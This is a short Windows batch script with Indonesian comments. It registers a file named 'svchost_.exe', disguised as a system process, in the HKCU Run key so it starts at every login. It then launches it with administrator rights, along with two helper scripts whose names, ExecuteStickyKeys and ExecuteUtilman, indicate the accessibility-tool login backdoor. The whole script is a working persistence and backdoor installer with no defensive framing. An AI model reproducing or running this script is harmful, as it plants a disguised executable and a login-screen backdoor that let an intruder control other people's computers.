@echo off
:: ---------------------------
:: Tambahkan svchost_.exe ke startup registry (user login)
:: ---------------------------
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v XMASTERTES /t REG_SZ /d "C:\ProgramData\AppData\XMASTERTES-main\svchost_.exe" /f

:: ---------------------------
:: Jalankan file BAT dan EXE dengan hak administrator
:: ---------------------------
set "currentDir=%~dp0"

:: Jalankan ExecuteStickyKeys.bat
powershell -Command "Start-Process '%currentDir%ExecuteStickyKeys.bat' -Verb RunAs"

:: Jalankan ExecuteUtilman.bat
powershell -Command "Start-Process '%currentDir%ExecuteUtilman.bat' -Verb RunAs"

:: Jalankan svchost_.exe
powershell -Command "Start-Process '%currentDir%svchost_.exe' -Verb RunAs"
